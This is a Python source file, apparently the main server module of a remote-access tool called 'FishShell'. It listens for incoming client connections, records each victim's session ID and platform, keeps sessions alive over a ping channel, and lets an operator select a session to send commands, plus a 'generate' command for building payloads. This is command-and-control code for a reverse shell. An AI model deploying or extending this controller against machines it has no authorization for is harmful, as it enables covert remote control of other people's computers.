import os
import sys
import time
import pickle
import threading
import traceback
import subprocess
import socket as sock
from datetime import datetime
import sources.functions.var.globals as g
from sources.functions.banner import banner
from sources.functions.help import help_menu
from sources.functions.generate import generate
from sources.functions.session import send_command
from sources.functions.session import rev_shell, ses
from sources.functions.ClearScreen import clear_screen


try:
    from tabulate import tabulate
except ModuleNotFoundError:
    print("Installing Dependencies...\n")
    subprocess.call(['pip', 'install', '-r', 'requirements.txt'])
    from tabulate import tabulate
except Exception as err:
    print()
    print(err)
    print()


def create_threads():
    global shell_thread, listen_thread
    shell_thread = threading.Thread(target=call_shell)
    listen_thread = threading.Thread(target=listen)
    listen_thread.daemon = True


def call_shell():
    banner()
    shell()


def listen():
    accept_thread = threading.Thread(target=accept_connections)
    accept_thread.daemon = True
    accept_thread.start()
    ping_thread = threading.Thread(target=start_ping())
    ping_thread.daemon = True
    ping_thread.start()


def print_input():
    with lock:
        if ses is not None:
            print(session, end='', flush=True)
        elif rev_shell is not None:
            print(rev_shell, end='', flush=True)
        else:
            print("FishShell >>> ", end='', flush=True)


def start_server():
    try:
        global ping
        g.server = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        ping = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        g.server.bind((g.host, g.port))
        pn_port = g.port+1
        ping.bind((g.host, pn_port))
        g.server.listen()
        ping.listen()
        msg = f"[{g.g}Info{g.e}] Listening on '{g.host}' at port '{g.port}'"
        return True, msg
    except OSError:
        msg = f"[{g.r}Error{g.e}] Specified port already in use\n[{g.bl}Fix{g.e}] Use 'set lport <PORT> to set a different port"
    except Exception as msg:
        pass
    g.server = None
    g.accept = False
    return False, msg


def accept_connections():
    while not g.till and g.accept:
        try:
            client, addr = g.server.accept()
            g.server.setblocking(1)
            Id = (client.recv(5120)).decode()
            platform = (client.recv(5120)).decode()
            when = datetime.now()
            g.all_conns[Id] = [client, addr, platform, when, None, 'Active']
            g.active_conns[Id] = [client, addr, platform, when, None]
            with lock:
                print('\n')
                print(f"[{g.g}Info{g.e}] New Connection!")
                print(f"[{g.g}Info{g.e}] '{addr[0]}:{addr[1]}' has connected to the server as '{Id}'\n")
                print_input()
        except Exception as error:
            if not g.till and g.accept:
                with lock:
                    print('\n')
                    print(error)
                    print()
                    print("Error While accepting Connections\n")
                print_input()
    return


def start_ping():
    accept_ping_thread = threading.Thread(target=accept_ping)
    accept_ping_thread.daemon = True
    send_ping_thread = threading.Thread(target=send_ping)
    send_ping_thread.daemon = True
    accept_ping_thread.start()
    send_ping_thread.start()


def accept_ping():
    global ping
    while not g.till and g.accept:
        try:
            ping_client, addr = ping.accept()
            ping.setblocking(1)
            Id = (ping_client.recv(5120)).decode()
            g.all_conns[Id][-2] = ping_client
            g.active_conns[Id][-1] = ping_client
        except:
            print(traceback.format_exc())
    return


def send_ping():
    while not g.till and g.accept:
        current_conns = g.active_conns.copy()
        if not current_conns:
            continue
        close = []
        for Id in current_conns:
            if current_conns[Id][-1] is None:
                continue
            try:
                ping_client = g.active_conns[Id][-1]
                ping_client.send(b'ping')
                if ping_client.recv(5120) == b'true':
                    continue
                close.append(Id)
            except:
                close.append(Id)
        for Id in close:
            try:
                del g.active_conns[Id]
            except:
                pass
    return


def list_all_connections():
    results = [['Session ID', 'IP', 'Port', 'Platform', 'Time', 'Status']]
    for Id in g.all_conns:
        it = g.all_conns[Id]
        conn = it[0]
        try:
            conn.send(b'start')
            conn.send(b'is_alive')
            if conn.recv(1024) != b'alive':
                it[5] = 'Closed/Died'
            else:
                g.active_conns[Id] = [it[0], it[1], it[2], it[3], it[4]]
        except:
            it[5] = 'Closed/Died'
        connection = [str(Id), it[1][0], str(it[1][1]), it[2], it[3], it[5]]
        results.append(connection)
    print()
    print("+—————————————————————————————————+")
    print("|  <----------Clients---------->  |")
    print("+—————————————————————————————————+")
    print()
    if len(results) == 1:
        print("+----------------+")
        print("| No connections |")
        print("+----------------+")
    else:
        print(tabulate(results, headers='firstrow', tablefmt='fancy_grid'))
    print()


def list_active_connections():
    results = [['Session ID', 'IP', 'Port', 'Platform', 'Time']]
    for Id in g.all_conns:
        it = g.all_conns[Id]
        conn = it[0]
        try:
            conn.send(b'start')
            conn.send(b'is_alive')
            if conn.recv(1024) != b'alive':
                continue
        except:
            continue
        g.active_conns[Id] = [it[0], it[1], it[2], it[3], it[4]]
        connection = [str(Id), it[1][0], str(it[1][1]), it[2], it[3]]
        results.append(connection)
    print()
    print("+————————————————————————————————————————+")
    print("|  <----------Active_Clients---------->  |")
    print("+————————————————————————————————————————+")
    print()
    if len(results) == 1:
        print("+-----------------------+")
        print("| No Active connections |")
        print("+-----------------------+")
    else:
        print(tabulate(results, headers='firstrow', tablefmt='fancy_grid'))
    print()


def select_client(Id):
    if Id in g.active_conns:
        try:
            client = g.active_conns[Id][0]
            addr = g.active_conns[Id][1]
            print()
            print(f"Joined session of [{addr[0]}:{addr[1]}]")
            print()
            client.send(b'start')
            send_command(client=client, Id=Id)
        except sock.timeout:
            print()
            print("Session may have died")
            print()
        except Exception as e:
            print()
            print(traceback.format_exc())
            print()
            print(e)
            print()
    elif Id in g.all_conns:
        print()
        print("Session was closed")
        print()
    else:
        print()
        print("Session ID not found")
        print()


def close_connection(Id):
    if Id in g.active_conns:
        try:
            client = g.active_conns[Id][0]
            addr = g.active_conns[Id][1]
            client.send(b'start')
            client.send(b'close')
            client.close()
            del g.active_conns[Id]
            print(f"Closed connection with [{addr[0]}:{addr[1]}]")
        except sock.timeout:
            print()
            print("Session may have already died")
            print()
        except exception as e:
            print()
            print(e)
            print()
    elif Id in g.all_conns:
        print()
        print("Session was already closed")
        print()
    else:
        print("Session ID not found")


def close_all_connections():
    for Id in g.active_conns:
        client = g.active_conns[Id][0]
        client.send(b'start')
        client.send(b'close')
        client.close()
    g.active_conns.clear()


def quit_shell():
    for Id in g.active_conns:
        client = g.active_conns[Id][0]
        client.send(b'start')
        client.send(b'quit')
        client.close()
    g.active_conns.clear()


def shell():
    global cmnd
    while not g.till:
        try:
            print()
            cmnd = input("FishShell >>> ")
            if 'help' in cmnd or '-h' in cmnd:
                print()
                help_menu(command=cmnd)
            elif cmnd == 'clear':
                clear_screen()
            elif cmnd[:9] == 'set lhost':
                if g.server is not None:
                    print()
                    print("Error : Server already running")
                    print("Restart the program to change 'lhost'")
                    continue
                g.host = cmnd[10:]
                print()
                print(f'lhost set to --> {g.host}')
            elif cmnd[:9] == 'set lport':
                if g.server is not None:
                    print()
                    print("Error : Server already running")
                    print("Restart the program to change 'lport'")
                    continue
                g.port = int(cmnd[10:])
                print()
                print(f'lport set to --> {g.port}')
            elif cmnd[:8] == 'generate':
                generate(data=cmnd)
            elif cmnd == 'listen':
                again = True
                if g.host == '192.168.29.17' and g.port == 3784:
                    print()
                    print("'lhost' and 'lport' not set, continuing with default parameters")
                if g.server is None:
                    again = False
                    state, msg = start_server()
                    if state is True:
                        g.accept = True
                        listen_thread.start()
                    print()
                    print(msg)
                if g.server is not None and again is True:
                    g.accept = True
                    listen_thread.start()
                again = True
            elif cmnd == 'list -active':
                list_active_connections()
            elif cmnd == 'list -all':
                list_all_connections()
            elif cmnd[:6] == 'select':
                Id = cmnd[7:]
                select_client(Id=Id)
            elif cmnd[:5] == 'close':
                if g.server is None:
                    print()
                    print("No active connections to close")
                    print("Enter 'listen' to start listening for connections")
                    continue
                Id = cmnd[6:]
                close_connection(Id)
            elif cmnd == 'close -all':
                if g.server is None:
                    print()
                    print("No active connections to close")
                    print("Enter 'listen' to start listening for connections")
                    continue
                close_all_connections()
            elif cmnd.lower() in ['exit', 'quit', 'q', 'x']:
                print()
                print("Enter 'qs' to exit/quit shell")
                print("Enter 'q!' to force quit shell and clients")
            elif cmnd == 'qs':
                g.till, g.accept = True, False
                print()
                if g.server is not None:
                    if len(g.active_conns) != 0:
                        print("Closing connections...")
                        quit_shell()
                    else:
                        print("No active connections...Closed None")
                    print("Quiting Server...\n")
                    g.server.close()
                print("Exit code : o")
                break
            elif cmnd == 'q!':
                g.till, g.accept = True, False
                print()
                if g.server is not None:
                    if len(g.active_conns) != 0:
                        print("Quiting clients...")
                        print("Closing connections...")
                        close_all_connections()
                    else:
                        print("No active connections...Closed None")
                    quit_shell()
                    print("Quiting Server...\n")
                    g.server.close()
                print("Exit code : 1")
                break
            elif cmnd[:len(cmnd)] == (len(cmnd)*' ') or cmnd == '':
                pass
            else:
                help_menu(command=cmnd)
        except KeyboardInterrupt:
            print()
            print("Enter 'qs' to exit/quit shell")
            print("Enter 'q!' to force quit shell and clients")
        except EOFError:
            print()
            print("Enter 'qs' to exit/quit shell")
            print("Enter 'q!' to force quit shell and clients")
        except Exception as error:
            print()
            print(traceback.format_exc())
            print()
            print(error)
            shell()
    return


def main():
    global lock
    lock = threading.Lock()
    g.initialize()
    g.all_conns = {}
    g.active_conns = {}
    g.till, g.accept = False, False
    g.server = None
    g.host, g.port = '192.168.29.17', 3784
    create_threads()
    try:
        shell_thread.start()
        shell_thread.join()
    except KeyboardInterrupt:
        pass
    except Exception:
        print(traceback.format_exc())


if __name__ == '__main__':
    os.system("cmd /c cls")
    main()
    print()
    input("Press enter to continue...")
    sys.exit()
